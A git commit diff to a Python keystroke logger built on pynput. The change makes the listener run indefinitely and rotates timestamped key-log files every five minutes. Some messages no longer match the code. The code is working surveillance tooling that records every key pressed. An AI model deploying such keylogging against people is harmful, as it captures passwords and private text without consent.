86964725f5b28568b79c7fb9e8b3d5d2339249d0
jsylwester <jsylwester@tudelft.nl>
2025-11-19 19:49:49 +0100

    Continuously add keylog files at 5 minute intervals

--- main.py
+++ main.py
@@ -1,12 +1,5 @@
-import time
-import datetime
+import time,datetime,pyautogui
 from pynput import keyboard
-
-current_session = datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S.%f")
-
-#Writing to file
-session_file = open(f"key-logs/session-{current_session}.txt", "a")
-
 
 def on_key_press(key):
     print("Key pressed: ", key)
@@ -25,15 +18,20 @@ keyboard_listener = keyboard.Listener(
     on_press=on_key_press,
     on_release=on_key_release
 )
-
-
-
-print("Starting the keyboard listener, will run for 5 seconds..")
 keyboard_listener.start()
 
-time.sleep(10)
-print("Time's up, stopping the keyboard listener")
+while True:
+    current_session = datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S.%f")
 
-keyboard_listener.stop()
-keyboard_listener.join()
-session_file.close()
+    #Writing to file
+    session_file = open(f"key-logs/session-{current_session}.txt", "a")
+
+    print("Starting the keyboard listener, will run for 5 seconds..")
+
+
+    time.sleep(300)
+    print("Time's up, stopping the keyboard listener")
+
+    #keyboard_listener.stop()
+    #keyboard_listener.join()
+    session_file.close()
